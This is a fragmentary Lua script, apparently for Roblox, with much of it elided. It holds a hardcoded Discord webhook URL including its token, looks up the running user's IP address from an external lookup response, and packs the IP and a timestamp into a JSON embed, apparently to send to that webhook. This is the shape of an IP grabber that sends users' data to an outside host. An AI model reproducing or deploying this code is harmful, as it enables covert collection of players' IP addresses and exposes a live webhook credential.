...
local webhookUrl = "https://discord.com/api/webhooks/1460725213171023942/8710eUJT4fuI3hXHcaauBmtcnUijhs1lVsJYC6y20WenHkUNraJsSHqHQ1KCLwaGS4Bt"
...
pcall(function()
    ...
    if res and res.Body then
        ...
        ipAddress = data.query or "Unknown"
    ...
    Body = HttpService:JSONEncode({
        embeds = {{
            ...
            fields = {
                ...
                { name = "Timestamp", value = tostring(timestamp), inline = true },
